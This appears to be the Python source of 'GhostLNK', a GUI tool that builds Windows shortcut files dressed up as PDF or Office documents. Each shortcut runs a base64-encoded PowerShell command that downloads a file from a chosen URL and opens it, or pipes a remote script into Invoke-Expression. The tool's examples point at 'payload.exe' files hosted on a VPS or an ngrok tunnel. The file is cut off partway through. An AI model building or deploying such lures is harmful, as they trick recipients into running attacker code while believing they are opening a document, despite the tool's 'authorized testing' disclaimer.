#!/usr/bin/env python3
"""
GhostLNK - Professional LNK Generator with Debug Mode
Coded for educational and authorized testing purposes only
"""

import os
import sys
import base64
import json
import subprocess
import re
import tempfile
import time
from datetime import datetime
from pathlib import Path

# Try to import required libraries
try:
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                 QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                 QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                 QTabWidget, QListWidget, QListWidgetItem, QMenu,
                                 QSplitter, QFrame, QProgressBar, QToolTip,
                                 QScrollArea)
    from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal, QSize
    from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard, QScreen
except ImportError:
    print("[-] PyQt6 not installed. Installing...")
    os.system("pip install PyQt6")
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                 QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                 QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                 QTabWidget, QListWidget, QListWidgetItem, QMenu,
                                 QSplitter, QFrame, QProgressBar, QToolTip,
                                 QScrollArea)
    from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal, QSize
    from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard, QScreen

try:
    import pylnk3
except ImportError:
    print("[-] pylnk3 not installed. Installing...")
    os.system("pip install pylnk3")
    import pylnk3

# Configuration file
CONFIG_FILE = "ghostlnk_config.json"

class URLExamples:
    """Collection of URL examples for different scenarios"""
    
    # Generic Dropbox example (not real)
    DROPBOX_EXAMPLE = "https://www.dropbox.com/scl/fi/6z4ogo404tOtr/file_name?rlkey=rl63zpok5gork304fw23&dl=1"
    
    EXAMPLES = {
        "Dropbox PDF": {
            "url": DROPBOX_EXAMPLE,
            "description": "Dropbox shared file - Must end with dl=1 for direct download",
            "type": "document",
            "note": "⚠️ Dropbox URLs need '&dl=1' or '?dl=1' at the end for direct download"
        },
        "Your VPS - File": {
            "url": "http://YOUR-VPS-IP:8000/payload.exe",
            "description": "Host your own file on a VPS using Python HTTP server",
            "type": "executable",
            "note": "Start server: python3 -m http.server 8000"
        },
        "Your VPS - Script": {
            "url": "http://YOUR-VPS-IP:8000/script.ps1",
            "description": "Host PowerShell scripts on your VPS",
            "type": "script",
            "note": "Make sure script is accessible via wget"
        },
        "GitHub Raw": {
            "url": "https://raw.githubusercontent.com/username/repo/branch/file.pdf",
            "description": "Raw GitHub files - Good for testing",
            "type": "document",
            "note": "Use raw.githubusercontent.com, not regular github.com"
        },
        "Direct File Server": {
            "url": "https://example.com/files/document.pdf",
            "description": "Direct link to file on any server",
            "type": "document",
            "note": "Ensure the server allows direct downloads"
        },
        "NGrok Tunnel": {
            "url": "https://your-ngrok-id.ngrok.io/payload.exe",
            "description": "Expose local server via ngrok",
            "type": "executable",
            "note": "Use ngrok http 8000 to expose local server"
        }
    }
    
    @staticmethod
    def get_all_examples():
        return URLExamples.EXAMPLES
    
    @staticmethod
    def get_dropbox_note():
        return "📌 Dropbox Tip: Always add '&dl=1' to the end of shared links to force direct download"


class PowerShellConverter:
    """Convert URLs to PowerShell -E format"""
    
    @staticmethod
    def url_to_powershell_command(url, use_invoke=True):
        """Convert URL to PowerShell command"""
        if use_invoke:
            ps_command = f"Invoke-Expression (wget -useb '{url}')"
        else:
            ps_command = f"Invoke-Expression (Invoke-WebRequest -Uri '{url}')"
        return ps_command
    
    @staticmethod
    def validate_dropbox_url(url):
        """Check if Dropbox URL has correct parameters"""
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                return False, "Dropbox URL missing 'dl=1' parameter. Add '&dl=1' or '?dl=1' to the end."
            return True, "Valid Dropbox URL"
        return True, "Not a Dropbox URL"
    
    @staticmethod
    def url_to_powershell_with_debug(url, pause=True):
        """
        Create a PowerShell command with debug output
        """
        # Validate Dropbox URLs
        is_dropbox, dropbox_msg = PowerShellConverter.validate_dropbox_url(url)
        dropbox_warning = ""
        if not is_dropbox:
            dropbox_warning = f"""
# ⚠️ DROPBOX WARNING: {dropbox_msg}
# The download may fail without the correct parameter!
"""
        
        pause_cmd = "pause" if pause else "Start-Sleep -Seconds 5"
        
        ps_command = f'''
# GhostLNK Debug Mode - Verbose Output
{dropbox_warning}
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "👻 GhostLNK Debug Mode - Execution Started" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow

# Check if it's a Dropbox URL
if ("{url}" -like "*dropbox.com*") {{
    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow
    if ("{url}" -notlike "*dl=1*") {{
        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red
        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red
    }} else {{
        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green
    }}
}}

# Test URL accessibility
try {{
    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow
    $testRequest = [System.Net.WebRequest]::Create("{url}")
    $testRequest.Method = "HEAD"
    $testRequest.Timeout = 5000
    $testResponse = $testRequest.GetResponse()
    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green
    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green
    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green
    $testResponse.Close()
}}
catch {{
    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red
    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red
}}

Write-Host ""
Write-Host "[+] Creating WebClient object..." -ForegroundColor Yellow
$wc = New-Object System.Net.WebClient

# Setup download
$tempFile = [System.IO.Path]::GetTempFileName()
$outputFile = $tempFile + ".tmp"
Write-Host "[+] Temporary file: $outputFile" -ForegroundColor Yellow

try {{
    Write-Host "[+] Starting download at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Yellow
    $downloadStart = Get-Date
    
    # Download with progress
    $wc.DownloadFile("{url}", $outputFile)
    
    $downloadEnd = Get-Date
    $duration = $downloadEnd - $downloadStart
    $fileSize = (Get-Item $outputFile).Length
    
    Write-Host "[✓] Download completed at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green
    Write-Host "[✓] Download duration: $($duration.TotalSeconds) seconds" -ForegroundColor Green
    Write-Host "[✓] File size: $fileSize bytes ($([math]::Round($fileSize/1MB,2)) MB)" -ForegroundColor Green
    
    # Check if file was downloaded successfully
    if (Test-Path $outputFile) {{
        Write-Host "[✓] File saved successfully to: $outputFile" -ForegroundColor Green
        
        # Show file information
        $fileInfo = Get-Item $outputFile
        Write-Host "[+] File created: $($fileInfo.CreationTime)" -ForegroundColor Yellow
        Write-Host "[+] File modified: $($fileInfo.LastWriteTime)" -ForegroundColor Yellow
        
        # Try to determine file type
        $fileHeader = Get-Content $outputFile -Encoding Byte -TotalCount 4
        $headerHex = ($fileHeader | ForEach-Object {{ $_.ToString("X2") }}) -join ""
        Write-Host "[+] File header (hex): $headerHex" -ForegroundColor Yellow
        
        # Identify file type by header
        if ($headerHex -like "25504446") {{
            Write-Host "[✓] File appears to be a PDF document" -ForegroundColor Green
        }} elseif ($headerHex -like "4D5A*") {{
            Write-Host "[✓] File appears to be an executable (PE file)" -ForegroundColor Green
        }} elseif ($headerHex -like "504B0304") {{
            Write-Host "[✓] File appears to be a ZIP archive" -ForegroundColor Green
        }} elseif ($headerHex -like "FFD8FF*") {{
            Write-Host "[✓] File appears to be a JPEG image" -ForegroundColor Green
        }}
        
        # Open the file
        Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow
        Invoke-Item $outputFile
        Write-Host "[✓] File opened successfully!" -ForegroundColor Green
    }}
    else {{
        Write-Host "[✗] File was not created!" -ForegroundColor Red
    }}
}}
catch {{
    Write-Host "[✗] Download failed: $_" -ForegroundColor Red
    Write-Host "[✗] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red
    
    # Specific error help
    if ($_.Exception.Message -like "*404*") {{
        Write-Host "[💡] TIP: 404 error means file not found - Check the URL" -ForegroundColor Cyan
    }} elseif ($_.Exception.Message -like "*403*") {{
        Write-Host "[💡] TIP: 403 error means forbidden - Server may block automated downloads" -ForegroundColor Cyan
    }} elseif ($_.Exception.Message -like "*dropbox*") {{
        Write-Host "[💡] TIP: For Dropbox, ensure URL ends with '?dl=1' or '&dl=1'" -ForegroundColor Cyan
    }}
}}
finally {{
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "👻 GhostLNK Debug Mode - Execution Complete" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
}}

Write-Host ""
Write-Host "Press any key to exit this window..." -ForegroundColor White
{pause_cmd}
'''
        return ps_command.strip()
    
    @staticmethod
    def encode_powershell_command(ps_command):
        """Encode PowerShell command to base64"""
        ps_command_utf16 = ps_command.encode('utf-16le')
        encoded = base64.b64encode(ps_command_utf16).decode('utf-8')
        return encoded
    
    @staticmethod
    def create_full_powershell_argument(ps_command):
        """Create full -E argument"""
        encoded = PowerShellConverter.encode_powershell_command(ps_command)
        return f"-E {encoded}"
    
    @staticmethod
    def decode_powershell_argument(encoded_arg):
        """Decode PowerShell -E argument"""
        if encoded_arg.startswith('-E '):
            encoded_arg = encoded_arg[3:]
        elif encoded_arg.startswith('-e '):
            encoded_arg = encoded_arg[3:]
        
        try:
            decoded_bytes = base64.b64decode(encoded_arg)
            decoded = decoded_bytes.decode('utf-16le')
            return decoded
        except:
            try:
                decoded = decoded_bytes.decode('utf-8')
                return decoded
            except:
                return None


class LNKEngine:
    """Core LNK generation engine"""
    
    @staticmethod
    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index, description, working_dir=None):
        """Create a Windows LNK file"""
        # Parse target path
        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]
        target_directory = working_dir or '\\'.join(target_split[:-1])
        
        # Create LNK object
        lnk = pylnk3.create(output_filename)
        
        # Set basic information
        lnk.specify_local_location(target_path)
        
        # Configure link info
        lnk._link_info.size_local_volume_table = 0
        lnk._link_info.volume_label = ""
        lnk._link_info.drive_serial = 0
        lnk._link_info.local = True
        lnk._link_info.local_base_path = target_path
        
        # Set window mode and arguments
        lnk.window_mode = 'Normal'
        if arguments:
            lnk.arguments = arguments
            
        # Set icon
        lnk.icon = icon_path
        lnk.icon_index = icon_index
            
        # Set working directory
        lnk.working_dir = target_directory
        
        # Set description
        if description:
            lnk.description = description
            
        # Build the shell item ID list
        def build_entry(name, is_dir):
            entry = pylnk3.PathSegmentEntry()
            entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
            entry.file_size = 0
            
            n = datetime.now()
            entry.modified = n
            entry.created = n
            entry.accessed = n
            
            entry.short_name = name
            entry.full_name = name
            
            return entry
        
        # Create the path hierarchy
        elements = [
            pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
            pylnk3.DriveEntry(target_drive)
        ]
        
        # Add each directory in the path
        for level in target_split[1:-1]:
            if level:
                entry = build_entry(level, is_dir=True)
                elements.append(entry)
        
        # Add the target file
        entry = build_entry(target_file, is_dir=False)
        elements.append(entry)
        
        # Set the shell item ID list
        lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
        lnk.shell_item_id_list.items = elements
        
        # Write the LNK file
        with open(output_filename, 'wb') as f:
            lnk.write(f)
        
        return True


class GhostLNKGUI(QMainWindow):
    """Main GUI Window - GhostLNK"""
    
    # Icon database
    ICON_DATABASE = {
        "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
        "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
        "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3, ".xls"),
        "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
        "Folder": (r"C:\Windows\System32\SHELL32.dll", 4, ""),
        "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
        "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
        "MP3 Audio": (r"C:\Windows\System32\imageres.dll", 125, ".mp3"),
        "Video File": (r"C:\Windows\System32\SHELL32.dll", 118, ".mp4"),
    }
    
    def __init__(self):
        super().__init__()
        self.recent_urls = []
        self.recent_conversions = []
        self.load_config()
        self.init_ui()
        
    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.recent_urls = config.get('recent_urls', [])
                    self.recent_conversions = config.get('recent_conversions', [])
            except:
                self.recent_urls = []
                self.recent_conversions = []
    
    def save_config(self):
        """Save configuration to file"""
        config = {
            'recent_urls': self.recent_urls[-20:],
            'recent_conversions': self.recent_conversions[-20:]
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
    
    def init_ui(self):
        """Initialize the user interface with proper sizing"""
        self.setWindowTitle("👻 GhostLNK v1.0 - URL to PowerShell -E Converter")
        
        # Get screen geometry and set window to 90% of screen size
        screen = QApplication.primaryScreen().availableGeometry()
        window_width = int(screen.width() * 0.9)
        window_height = int(screen.height() * 0.85)
        self.setGeometry(50, 50, window_width, window_height)
        
        # Set minimum size to ensure usability
        self.setMinimumSize(1200, 700)
        
        # Set dark theme with ghostly accents
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a2e;
            }
            QLabel {
                color: #e0e0e0;
                font-size: 11px;
            }
            QLineEdit, QTextEdit, QComboBox, QSpinBox {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #0f3460;
                border-radius: 3px;
                padding: 4px;
                font-size: 11px;
            }
            QPushButton {
                background-color: #0f3460;
                color: white;
                border: none;
                border-radius: 3px;
                padding: 6px;
                font-size: 11px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #1a4b8c;
            }
            QPushButton:pressed {
                background-color: #0a2647;
            }
            QGroupBox {
                color: #e0e0e0;
                border: 2px solid #0f3460;
                border-radius: 5px;
                margin-top: 8px;
                font-size: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QTabWidget::pane {
                border: 1px solid #0f3460;
                background-color: #1a1a2e;
            }
            QTabBar::tab {
                background-color: #16213e;
                color: #e0e0e0;
                padding: 6px;
                margin-right: 2px;
                font-size: 11px;
            }
            QTabBar::tab:selected {
                background-color: #0f3460;
            }
            QListWidget {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #0f3460;
                font-size: 11px;
            }
            QCheckBox {
                color: #e0e0e0;
                font-size: 11px;
            }
        """)
        
        # Central widget with scroll area for small screens
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(8, 8, 8, 8)
        
        # Title with ghost effect
        title_label = QLabel("👻 GhostLNK - URL to PowerShell LNK Converter 👻")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_font = QFont("Arial", 16, QFont.Weight.Bold)
        title_label.setFont(title_font)
        title_label.setStyleSheet("color: #a8a8ff; padding: 5px;")
        main_layout.addWidget(title_label)
        
        # Subtitle with Dropbox note
        subtitle = QLabel("📌 Dropbox: Always add '&dl=1' for direct download | Example: dropbox.com/scl/fi/...&dl=1")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #ffaa00; padding-bottom: 5px; font-weight: bold; font-size: 11px;")
        main_layout.addWidget(subtitle)
        
        # Create horizontal splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        splitter.setHandleWidth(2)
        main_layout.addWidget(splitter)
        
        # Left panel - Converter (with scroll)
        left_scroll = QScrollArea()
        left_scroll.setWidgetResizable(True)
        left_scroll.setStyleSheet("QScrollArea { border: none; }")
        left_panel = self.create_converter_panel()
        left_scroll.setWidget(left_panel)
        splitter.addWidget(left_scroll)
        
        # Right panel - LNK Generator (with scroll)
        right_scroll = QScrollArea()
        right_scroll.setWidgetResizable(True)
        right_scroll.setStyleSheet("QScrollArea { border: none; }")
        right_panel = self.create_lnk_panel()
        right_scroll.setWidget(right_panel)
        splitter.addWidget(right_scroll)
        
        # Set equal split
        splitter.setSizes([int(window_width * 0.45), int(window_width * 0.45)])
        
        # Console output
        console_group = QGroupBox("👻 Ghost Console - Debug Output")
        console_layout = QVBoxLayout()
        console_layout.setSpacing(3)
        
        # Console toolbar
        console_toolbar = QHBoxLayout()
        console_toolbar.setSpacing(5)
        
        clear_console_btn = QPushButton("Clear Console")
        clear_console_btn.setMaximumWidth(100)
        clear_console_btn.clicked.connect(lambda: self.console.clear())
        console_toolbar.addWidget(clear_console_btn)
        
        save_console_btn = QPushButton("Save Log")
        save_console_btn.setMaximumWidth(80)
        save_console_btn.clicked.connect(self.save_console_log)
        console_toolbar.addWidget(save_console_btn)
        
        console_toolbar.addStretch()
        console_layout.addLayout(console_toolbar)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setMaximumHeight(120)
        self.console.setStyleSheet("""
            background-color: #0a0a1a; 
            color: #9fdf9f; 
            font-family: 'Courier New', monospace;
            font-size: 10px;
            border: 1px solid #0f3460;
        """)
        console_layout.addWidget(self.console)
        console_group.setLayout(console_layout)
        main_layout.addWidget(console_group)
        
        # Status bar
        self.statusBar().showMessage("👻 GhostLNK is ready - Select an example URL below")
        self.statusBar().setStyleSheet("color: #a8a8ff; font-size: 11px;")
        
        # Create menus
        self.create_menu()
        
        # Welcome message
        self.log("👻 GhostLNK v1.0 initialized")
        self.log("[*] Dropbox Tip: Always use '&dl=1' at the end of shared links")
        self.log("[*] Example: https://www.dropbox.com/scl/fi/6z4ogo404tOtr/file_name?rlkey=xxx&dl=1")
    
    def create_converter_panel(self):
        """Create the converter panel with URL examples"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)
        layout.setContentsMargins(6, 6, 6, 6)
        
        # Header
        header = QLabel("🔮 URL to PowerShell -E Converter")
        header.setStyleSheet("font-size: 14px; font-weight: bold; color: #a8a8ff; padding: 2px;")
        layout.addWidget(header)
        
        # URL Examples Section - Compact grid
        examples_group = QGroupBox("📋 URL Examples")
        examples_layout = QVBoxLayout()
        examples_layout.setSpacing(4)
        
        # Dropbox example (highlighted)
        dropbox_layout = QHBoxLayout()
        dropbox_layout.setSpacing(4)
        
        dropbox_btn = QPushButton("📌 Dropbox PDF")
        dropbox_btn.setStyleSheet("background-color: #8B5F8B;")
        dropbox_btn.setMaximumWidth(120)
        dropbox_btn.clicked.connect(self.load_dropbox_example)
        dropbox_layout.addWidget(dropbox_btn)
        
        dropbox_url = QLabel("dropbox.com/scl/fi/...&dl=1")
        dropbox_url.setStyleSheet("color: #ffaa00; font-size: 10px;")
        dropbox_layout.addWidget(dropbox_url)
        
        dropbox_layout.addStretch()
        examples_layout.addLayout(dropbox_layout)
        
        # Other examples in 2-column grid
        examples_grid = QGridLayout()
        examples_grid.setSpacing(4)
        
        examples = [
            ("🖥️ VPS File", "http://YOUR-VPS:8000/file.exe", self.load_vps_file_example),
            ("🖥️ VPS Script", "http://YOUR-VPS:8000/script.ps1", self.load_vps_script_example),
            ("🐙 GitHub", "raw.githubusercontent.com/...", self.load_github_example),
            ("🌐 ngrok", "https://your-id.ngrok.io/file", self.load_ngrok_example),
            ("📁 Direct", "https://example.com/file.pdf", self.load_direct_example),
        ]
        
        for i, (name, tooltip, callback) in enumerate(examples):
            row, col = divmod(i, 2)
            btn = QPushButton(name)
            btn.setMaximumWidth(100)
            btn.clicked.connect(callback)
            btn.setToolTip(tooltip)
            examples_grid.addWidget(btn, row, col)
        
        examples_layout.addLayout(examples_grid)
        
        # Tips label
        tips = QLabel("💡 Dropbox: &dl=1 | VPS: python3 -m http.server 8000")
        tips.setStyleSheet("color: #8888aa; font-size: 9px; padding: 2px;")
        examples_layout.addWidget(tips)
        
        examples_group.setLayout(examples_layout)
        layout.addWidget(examples_group)
        
        # URL Input
        url_group = QGroupBox("Step 1: Enter URL")
        url_layout = QVBoxLayout()
        url_layout.setSpacing(2)
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://your-server.com/file.pdf")
        url_layout.addWidget(self.url_input)
        
        self.dropbox_indicator = QLabel("")
        self.dropbox_indicator.setStyleSheet("color: #ffaa00; font-size: 9px;")
        url_layout.addWidget(self.dropbox_indicator)
        
        self.url_input.textChanged.connect(self.validate_dropbox_url)
        
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        # Debug Options
        debug_group = QGroupBox("Step 2: Debug Options")
        debug_layout = QVBoxLayout()
        debug_layout.setSpacing(2)
        
        self.debug_mode_cb = QCheckBox("👁️ Enable Debug Mode (Verbose Output)")
        self.debug_mode_cb.setStyleSheet("color: #ffaa00;")
        debug_layout.addWidget(self.debug_mode_cb)
        
        self.pause_after_cb = QCheckBox("⏸️ Pause after execution")
        self.pause_after_cb.setChecked(True)
        debug_layout.addWidget(self.pause_after_cb)
        
        debug_group.setLayout(debug_layout)
        layout.addWidget(debug_group)
        
        # Conversion buttons
        convert_group = QGroupBox("Step 3: Generate")
        convert_layout = QVBoxLayout()
        convert_layout.setSpacing(3)
        
        btn_row1 = QHBoxLayout()
        btn_row1.setSpacing(3)
        
        self.show_cmd_btn = QPushButton("1️⃣ Show Command")
        self.show_cmd_btn.clicked.connect(self.show_powershell_command)
        btn_row1.addWidget(self.show_cmd_btn)
        
        self.encode_btn = QPushButton("2️⃣ Encode")
        self.encode_btn.setStyleSheet("background-color: #d35400;")
        self.encode_btn.clicked.connect(self.encode_url_to_powershell)
        btn_row1.addWidget(self.encode_btn)
        
        convert_layout.addLayout(btn_row1)
        
        btn_row2 = QHBoxLayout()
        btn_row2.setSpacing(3)
        
        self.copy_arg_btn = QPushButton("3️⃣ Copy -E")
        self.copy_arg_btn.clicked.connect(self.copy_full_argument)
        btn_row2.addWidget(self.copy_arg_btn)
        
        self.use_lnk_btn = QPushButton("🚀 Use in LNK")
        self.use_lnk_btn.setStyleSheet("background-color: #27ae60;")
        self.use_lnk_btn.clicked.connect(self.use_converted_in_lnk)
        btn_row2.addWidget(self.use_lnk_btn)
        
        convert_layout.addLayout(btn_row2)
        convert_group.setLayout(convert_layout)
        layout.addWidget(convert_group)
        
        # Results - Compact
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        results_layout.setSpacing(2)
        
        self.ps_command_display = QTextEdit()
        self.ps_command_display.setMaximumHeight(50)
        self.ps_command_display.setStyleSheet("font-size: 9px;")
        results_layout.addWidget(QLabel("PowerShell:"))
        results_layout.addWidget(self.ps_command_display)
        
        self.full_arg_display = QTextEdit()
        self.full_arg_display.setMaximumHeight(40)
        self.full_arg_display.setStyleSheet("font-size: 9px; color: #ff8888;")
        results_layout.addWidget(QLabel("-E Argument:"))
        results_layout.addWidget(self.full_arg_display)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        # Recent conversions
        recent_group = QGroupBox("Recent")
        recent_layout = QVBoxLayout()
        recent_layout.setSpacing(2)
        
        self.recent_list = QListWidget()
        self.recent_list.setMaximumHeight(80)
        self.recent_list.itemDoubleClicked.connect(self.use_recent_conversion)
        recent_layout.addWidget(self.recent_list)
        
        clear_btn = QPushButton("Clear")
        clear_btn.setMaximumWidth(60)
        clear_btn.clicked.connect(self.clear_recent)
        recent_layout.addWidget(clear_btn)
        
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        
        layout.addStretch()
        self.update_recent_list()
        
        return panel
    
    def create_lnk_panel(self):
        """Create the LNK generator panel - Compact version"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)
        layout.setContentsMargins(6, 6, 6, 6)
        
        # Header
        header = QLabel("📁 LNK Generator")
        header.setStyleSheet("font-size: 14px; font-weight: bold; color: #a8a8ff; padding: 2px;")
        layout.addWidget(header)
        
        # Quick import
        quick_group = QGroupBox("Import -E Argument")
        quick_layout = QHBoxLayout()
        quick_layout.setSpacing(3)
        
        self.quick_arg_input = QLineEdit()
        self.quick_arg_input.setPlaceholderText("Paste -E argument...")
        quick_layout.addWidget(self.quick_arg_input)
        
        import_btn = QPushButton("Import")
        import_btn.setMaximumWidth(60)
        import_btn.clicked.connect(self.import_from_converter)
        quick_layout.addWidget(import_btn)
        
        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)
        
        # Payload preview
        preview_group = QGroupBox("Payload")
        preview_layout = QVBoxLayout()
        preview_layout.setSpacing(2)
        
        preview_layout.addWidget(QLabel("Target: C:\\Windows\\...\\powershell.exe"))
        self.current_arg_label = QLabel("Arguments: (not set)")
        self.current_arg_label.setWordWrap(True)
        self.current_arg_label.setStyleSheet("color: #ffaa00; background-color: #16213e; padding: 3px; font-size: 9px;")
        preview_layout.addWidget(self.current_arg_label)
        
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Icon selection
        icon_group = QGroupBox("Icon")
        icon_layout = QVBoxLayout()
        icon_layout.setSpacing(2)
        
        self.icon_combo = QComboBox()
        self.icon_combo.addItems(list(self.ICON_DATABASE.keys())[:6])  # Show fewer items
        self.icon_combo.setCurrentText("PDF Document")
        icon_layout.addWidget(self.icon_combo)
        
        icon_group.setLayout(icon_layout)
        layout.addWidget(icon_group)
        
        # Filename
        file_group = QGroupBox("Filename")
        file_layout = QGridLayout()
        file_layout.setSpacing(3)
        
        file_layout.addWidget(QLabel("Name:"), 0, 0)
        self.filename_base = QLineEdit()
        self.filename_base.setText("Report")
        self.filename_base.setMaximumWidth(120)
        file_layout.addWidget(self.filename_base, 0, 1)
        
        file_layout.addWidget(QLabel("Ext:"), 1, 0)
        self.filename_ext = QComboBox()
        self.filename_ext.addItems([".pdf", ".doc", ".xls", ".txt"])
        self.filename_ext.setMaximumWidth(60)
        file_layout.addWidget(self.filename_ext, 1, 1)
        
        self.add_lnk_cb = QCheckBox("Add .lnk")
        self.add_lnk_cb.setChecked(True)
        file_layout.addWidget(self.add_lnk_cb, 2, 1)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # Description
        desc_group = QGroupBox("Description")
        desc_layout = QVBoxLayout()
        desc_layout.setSpacing(2)
        
        self.description_input = QTextEdit()
        self.description_input.setMaximumHeight(50)
        desc_layout.addWidget(self.description_input)
        
        gen_desc_btn = QPushButton("Generate Desc")
        gen_desc_btn.setMaximumWidth(100)
        gen_desc_btn.clicked.connect(self.generate_description)
        desc_layout.addWidget(gen_desc_btn)
        
        desc_group.setLayout(desc_layout)
        layout.addWidget(desc_group)
        
        # Generate button
        self.generate_btn = QPushButton("👻 GENERATE LNK 👻")
        self.generate_btn.setMinimumHeight(40)
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #6a1f7a;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #8a2be2;
            }
        """)
        self.generate_btn.clicked.connect(self.generate_lnk)
        layout.addWidget(self.generate_btn)
        
        layout.addStretch()
        return panel
    
    def create_menu(self):
        """Create menu bar"""
        menubar = self.menuBar()
        menubar.setStyleSheet("color: #e0e0e0; background-color: #16213e; font-size: 11px;")
        
        # File menu
        file_menu = menubar.addMenu("File")
        
        save_action = QAction("Save Config", self)
        save_action.triggered.connect(self.save_config)
        file_menu.addAction(save_action)
        
        load_action = QAction("Load Config", self)
        load_action.triggered.connect(self.load_config_dialog)
        file_menu.addAction(load_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Help menu
        help_menu = menubar.addMenu("Help")
        
        about_action = QAction("About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
        
        dropbox_help = QAction("Dropbox URL Help", self)
        dropbox_help.triggered.connect(self.show_dropbox_help)
        help_menu.addAction(dropbox_help)
    
    # Example loader methods
    def load_dropbox_example(self):
        self.load_example_url(URLExamples.DROPBOX_EXAMPLE)
    
    def load_vps_file_example(self):
        self.load_example_url("http://YOUR-VPS-IP:8000/payload.exe")
    
    def load_vps_script_example(self):
        self.load_example_url("http://YOUR-VPS-IP:8000/script.ps1")
    
    def load_github_example(self):
        self.load_example_url("https://raw.githubusercontent.com/username/repo/branch/file.pdf")
    
    def load_ngrok_example(self):
        self.load_example_url("https://your-ngrok-id.ngrok.io/payload.exe")
    
    def load_direct_example(self):
        self.load_example_url("https://example.com/files/document.pdf")
    
    def load_example_url(self, url):
        self.url_input.setText(url)
        self.validate_dropbox_url()
        self.log(f"[✓] Loaded: {url[:50]}...")
    
    def validate_dropbox_url(self):
        url = self.url_input.text().strip()
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                self.dropbox_indicator.setText("⚠️ Missing dl=1!")
                self.dropbox_indicator.setStyleSheet("color: #ff6666;")
            else:
                self.dropbox_indicator.setText("✓ dl=1 OK")
                self.dropbox_indicator.setStyleSheet("color: #66ff66;")
        else:
            self.dropbox_indicator.setText("")
    
    def show_powershell_command(self):
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Enter a URL")
            return
        
        if self.debug_mode_cb.isChecked():
